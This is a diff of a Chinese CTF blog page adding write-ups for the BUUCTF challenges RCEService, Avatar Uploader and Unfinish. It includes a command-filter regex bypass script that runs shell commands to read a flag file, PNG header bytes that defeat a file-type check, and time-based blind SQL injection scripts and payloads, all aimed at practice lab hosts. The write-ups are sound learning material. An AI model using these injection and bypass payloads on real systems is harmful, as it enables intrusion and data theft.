@@ -19,7 +19,14 @@
 <meta property="og:locale" content="en">
 <meta property="og:image" content="https://i.loli.net/2019/11/20/xeuvpKE9o6JIDhO.png">
 <meta property="og:image" content="https://i.loli.net/2019/11/20/LUpwftQ2kEXyZWV.png">
-<meta property="og:updated_time" content="2019-11-28T05:49:57.754Z">
+<meta property="og:image" content="https://i.loli.net/2019/11/29/Bmxs1cFYrvKD59e.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/29/jh8TN7mLqxCl6Oc.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/29/GwZTHDJ7tlnov3K.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/29/Tf4ezmL9kXRsAUd.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/29/AiflY1mXZoEGv8U.jpg">
+<meta property="og:image" content="https://i.loli.net/2019/11/29/5crpsXeG1RnizOE.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/29/umr8dyPWQh9wsXE.png">
+<meta property="og:updated_time" content="2019-11-29T12:36:13.329Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="buuctf-wp-8">
 <meta name="twitter:image" content="https://i.loli.net/2019/11/20/xeuvpKE9o6JIDhO.png">
@@ -186,8 +193,92 @@
 <p><code>&lt;%=xx%&gt;</code> </p>
 <p><img src="https://i.loli.net/2019/11/20/LUpwftQ2kEXyZWV.png" alt="Snipaste_2019-11-20_22-01-43.png"></p>
 <p>上面正好有匹配<code>ENV[&quot;SECRET&quot;]</code>的地方，所以利用 <code>$&amp;</code>获取上一次正则匹配的结果</p>
-<p><strong>感觉到处是知识盲区😶，下次学习一下再做</strong></p>
-<h3 id><a href="#" class="headerlink" title></a></h3><h4 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h4><p> <a href="http://www.l-team.org/archives/375.html" target="_blank" rel="noopener">http://www.l-team.org/archives/375.html</a> </p>
+<p><strong>是知识盲区😶，下次学习一下再做</strong></p>
+<h3 id="FBCTF2019-RCEService"><a href="#FBCTF2019-RCEService" class="headerlink" title="[FBCTF2019]RCEService"></a>[FBCTF2019]RCEService</h3><p>似乎原题给了源码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">putenv(&apos;PATH=/home/rceservice/jail&apos;);</span><br><span class="line"></span><br><span class="line">if (isset($_REQUEST[&apos;cmd&apos;])) &#123;</span><br><span class="line">  $json = $_REQUEST[&apos;cmd&apos;];</span><br><span class="line"></span><br><span class="line">  if (!is_string($json)) &#123;</span><br><span class="line">    echo &apos;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&apos;;</span><br><span class="line">  &#125; elseif (preg_match(&apos;/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+).*$/&apos;, $json)) &#123;</span><br><span class="line">    echo &apos;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&apos;;</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">    echo &apos;Attempting to run command:&lt;br/&gt;&apos;;</span><br><span class="line">    $cmd = json_decode($json, true)[&apos;cmd&apos;];</span><br><span class="line">    if ($cmd !== NULL) &#123;</span><br><span class="line">      system($cmd);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      echo &apos;Invalid input&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">    echo &apos;&lt;br/&gt;&lt;br/&gt;&apos;;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>第一个考点两种方法</p>
+<p>第一种，这里的<code>preg_match()</code>是会正则回溯的，因为存在两处<code>.*</code></p>
+<p>考虑之前p神<code>codebreaking-2</code>中的思路</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">payload = &apos;&#123;&quot;cmd&quot;:&quot;ls /home/rceservice/&quot;,&quot;zz&quot;:&quot;&apos; + &quot;a&quot;*(1000000) + &apos;&quot;&#125;&apos;</span><br><span class="line"># payload = &apos;&#123;&quot;cmd&quot;:&quot;find . -name flag&quot;,&quot;zz&quot;:&quot;&apos; + &quot;a&quot;*(1000000) + &apos;&quot;&#125;&apos;</span><br><span class="line">payload = &apos;&#123;&quot;cmd&quot;:&quot;/bin/cat /home/rceservice/flag&quot;,&quot;zz&quot;:&quot;&apos; + &quot;a&quot;*(1000000) + &apos;&quot;&#125;&apos;</span><br><span class="line">payload = &apos;&apos;&apos;&#123;</span><br><span class="line">&quot;cmd&quot;:&quot;ls /home/rceservice&quot;</span><br><span class="line">&#125;&apos;&apos;&apos;</span><br><span class="line">res = requests.post(&quot;http://ddfd3a5d-d80d-4fac-bd01-5a7f702a4689.node3.buuoj.cn&quot;, data=&#123;&quot;cmd&quot;:payload&#125;)</span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure>
+
+<p>第二种</p>
+<blockquote>
+<p>同样是<code>preg_match</code>的问题，由于它会努力去匹配第一行，所以我们可以利用<strong>多行</strong>的方法 </p>
+</blockquote>
+<p>因为<code>$</code>会匹配<code>%0a</code></p>
+<p>第二个考点</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">putenv(&apos;PATH=/home/rceservice/jail&apos;);</span><br></pre></td></tr></table></figure>
+
+<p>应用程序的PATH变量改了，所以我们得传入cmd的绝对路径</p>
+<blockquote>
+<p>注：Linux命令的位置：/bin,/usr/bin，默认都是全体用户使用，/sbin,/usr/sbin,默认root用户使用 </p>
+</blockquote>
+<h3 id="HarekazeCTF2019-Avatar-Uploader-1"><a href="#HarekazeCTF2019-Avatar-Uploader-1" class="headerlink" title="[HarekazeCTF2019]Avatar Uploader 1"></a>[HarekazeCTF2019]Avatar Uploader 1</h3><p><img src="https://i.loli.net/2019/11/29/Bmxs1cFYrvKD59e.png" alt="Snipaste_2019-11-29_15-04-02.png"></p>
+<p>首先<code>finfo_file</code>检查上传的文件是否为PNG格式，然后<code>getimagesize</code>再次检查其是否为PNG格式。如果前者通过了检查，而后者收到了不是PNG格式的决定，就给你flag</p>
+<p>自己之前都是用<code>GIF89a</code>一把梭，这里是<code>png</code>，那么先寻找文件头</p>
+<blockquote>
+<p>文件头：89504E47 文件尾：0000000049454E44AE426082 </p>
+</blockquote>
+<p>先用winhax做一个试试。。</p>
+<p><img src="https://i.loli.net/2019/11/29/jh8TN7mLqxCl6Oc.png" alt="Snipaste_2019-11-29_15-38-53.png"></p>
+<p>发现不太行，那么参考wp</p>
+<p>先本地写个判断的脚本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &apos;&lt;?php $f = finfo_open(FILEINFO_MIME_TYPE); var_dump(finfo_file($f, &quot;test.bin&quot;));&apos; &gt; test.php</span><br></pre></td></tr></table></figure>
+
+<p>直接开始写文件</p>
+<blockquote>
+<p><strong>echo -e 处理特殊字符</strong> </p>
+<p> <strong>echo -n 不换行输出</strong> </p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo -en &quot;\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\1\x90\0\0\1\x90\8\6\0\0\0\x80\xbf6\xcc&quot; &gt; test.bin; php test.php</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>其实这里发现我之前和这里相比少了点数据块，于是又重新搜索了一波，参考下面的链接</p>
+<p><a href="https://www.cnblogs.com/senior-engineer/p/9548347.html" target="_blank" rel="noopener">https://www.cnblogs.com/senior-engineer/p/9548347.html</a> </p>
+</blockquote>
+<p>我将原先的文件又填充了几位，一直到像素，为24*24</p>
+<p><img src="https://i.loli.net/2019/11/29/GwZTHDJ7tlnov3K.png" alt="Snipaste_2019-11-29_15-50-42.png"></p>
+<p>成功上传了，但是并没有flag，说明这时同时判断为真了，然后就是一步步删除文件块，直到两边返回的结果不同</p>
+<p><img src="https://i.loli.net/2019/11/29/Tf4ezmL9kXRsAUd.png" alt="Snipaste_2019-11-29_16-24-45.png"></p>
+<p>用命令行测试会更加方便</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo -en &quot;\x89PNG\r\n\x1a\n\0\0\0\rIHDR&quot; &gt; test.bin; php test.php</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>将可见的字符直接写出来，不可见的用16进制表示，以及<code>\0和\n和\r</code>特别注意</p>
+</blockquote>
+<p><strong>这里注意，一开始为了方便只是单纯把数据改成00，显示的是成功上传，需要全部删除</strong></p>
+<h3 id="Unfinish"><a href="#Unfinish" class="headerlink" title="Unfinish"></a>Unfinish</h3><p>是一个登录界面，但是没有注册，试试<code>register.php</code></p>
+<p>注册登录进去是我的用户名和一个大美女</p>
+<p>猜测是<code>insert into</code>注入</p>
+<p>猜测后台为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">insert into users(email,username,password) values ($email,$username,$password)</span><br><span class="line"></span><br><span class="line">select username from users</span><br></pre></td></tr></table></figure>
+
+<p>首先考虑盲注，构造</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&apos; or (case when 1=1 then sleep(3) else &apos;2&apos; end)=&apos;1</span><br><span class="line"></span><br><span class="line">=&gt;</span><br><span class="line"></span><br><span class="line">insert into users(email,username,password) values (&apos;aa&apos;,&apos;&apos; or (case when 1=1 then sleep(3) else &apos;2&apos; end)=&apos;1&apos;,&apos;bb&apos;)</span><br></pre></td></tr></table></figure>
+
+<p>成功延时，写个脚本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python2</span><br><span class="line"># coding=utf-8</span><br><span class="line">import requests</span><br><span class="line">from urllib.parse import quote</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    &apos;Host&apos;: &apos;bed22dfa-c222-43c8-a8e9-e21bea926a4e.node3.buuoj.cn&apos;,</span><br><span class="line">    &apos;User-Agent&apos;: &apos;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0&apos;,</span><br><span class="line">    &apos;Referer&apos;: &apos;http://bed22dfa-c222-43c8-a8e9-e21bea926a4e.node3.buuoj.cn/register.php&apos;</span><br><span class="line">&#125;</span><br><span class="line">cookies = &#123;</span><br><span class="line">    &apos;PHPSESSID&apos;: &apos;7im95s91eerad5qtvnmrh4cdp1&apos;</span><br><span class="line">&#125;</span><br><span class="line">url = &quot;http://bed22dfa-c222-43c8-a8e9-e21bea926a4e.node3.buuoj.cn/register.php&quot;</span><br><span class="line"></span><br><span class="line">flag = &quot;&quot;</span><br><span class="line">tmp = 0</span><br><span class="line">easy_strings = [ord(i) for i in &apos;abcdefghijklmnopqrstuvwxyz_,&apos;]</span><br><span class="line"># print(easy_strings)</span><br><span class="line"></span><br><span class="line">for i in range(1, 100):</span><br><span class="line">    if tmp == 1:</span><br><span class="line">        break</span><br><span class="line">    tmp = 1</span><br><span class="line">    for j in range(32, 127):</span><br><span class="line">    # for j in easy_strings:</span><br><span class="line">        payload = &quot;select database()&quot;</span><br><span class="line">        # payload = &quot;select group_concat(table_name) from information_schema.tables where table_schema=database()&quot;</span><br><span class="line">        # payload = &quot;select group_concat(column_name) from information_schema.columns where table_name=&apos;emails&apos;&quot;</span><br><span class="line">        param = &quot;&apos;or(case when ascii(mid((&#123;&#125;)from(&#123;&#125;)for(1)))=&#123;&#125; then sleep(3) else 2 end)=&apos;1&quot;.format(payload, str(i), str(j))</span><br><span class="line">        print(param)</span><br><span class="line">        data = &#123;</span><br><span class="line">            &quot;email&quot;: quote(&apos;aa@qq.com&apos;),</span><br><span class="line">            &quot;username&quot;: quote(param),</span><br><span class="line">            &quot;password&quot;: &quot;11&quot;</span><br><span class="line">        &#125;</span><br><span class="line">        try:</span><br><span class="line">            r = requests.post(url, headers=headers, cookies=cookies, data=data, timeout=3, allow_redirects=False)</span><br><span class="line">        except:</span><br><span class="line">            flag += chr(j)</span><br><span class="line">            tmp = 0</span><br><span class="line">            print(flag)</span><br><span class="line">            break</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>
+
+<p>希望哪个大佬能帮帮我看看这脚本哪有问题</p>
+<p><img src="https://i.loli.net/2019/11/29/AiflY1mXZoEGv8U.jpg" alt="TIM图片20191129194057.jpg"></p>
+<p>bp的intruder也行，但是比较麻烦</p>
+<p>方法二、</p>
+<blockquote>
+<p>参考之前buuctf-wp-2的<code>[RoarCTF 2019]Online Proxy</code></p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0&apos;+hex(substr((select database()),1,5))+&apos;0</span><br></pre></td></tr></table></figure>
+
+<p>过滤了逗号，考虑用<code>from、for</code>代替</p>
+<p><img src="https://i.loli.net/2019/11/29/5crpsXeG1RnizOE.png" alt="Snipaste_2019-11-29_20-31-17.png"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0&apos;+hex(mid((select database())from(1)for(5)))+&apos;0</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2019/11/29/umr8dyPWQh9wsXE.png" alt="Snipaste_2019-11-29_20-32-55.png"></p>
+<p>得到web</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0&apos;+hex(mid(()from(1)for(5)))+&apos;0</span><br></pre></td></tr></table></figure>
+
+<p>之后同理</p>
+<h3 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h3><p> <a href="http://www.l-team.org/archives/375.html" target="_blank" rel="noopener">http://www.l-team.org/archives/375.html</a> </p>
 
       
 
@@ -360,7 +451,7 @@
                 </span>
                 <span class="tooltip-content">
                     <div class="toc-article">
-                    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#SCTF2019-Flag-Shop"><span class="toc-number">1.</span> <span class="toc-text">[SCTF2019]Flag Shop</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#null"><span class="toc-number">2.</span> <span class="toc-text"></span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#参考链接："><span class="toc-number">2.1.</span> <span class="toc-text">参考链接：</span></a></li></ol></li></ol>
+                    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#SCTF2019-Flag-Shop"><span class="toc-number">1.</span> <span class="toc-text">[SCTF2019]Flag Shop</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#FBCTF2019-RCEService"><span class="toc-number">2.</span> <span class="toc-text">[FBCTF2019]RCEService</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HarekazeCTF2019-Avatar-Uploader-1"><span class="toc-number">3.</span> <span class="toc-text">[HarekazeCTF2019]Avatar Uploader 1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Unfinish"><span class="toc-number">4.</span> <span class="toc-text">Unfinish</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#参考链接："><span class="toc-number">5.</span> <span class="toc-text">参考链接：</span></a></li></ol>
                     </div>
                 </span>
             </div>
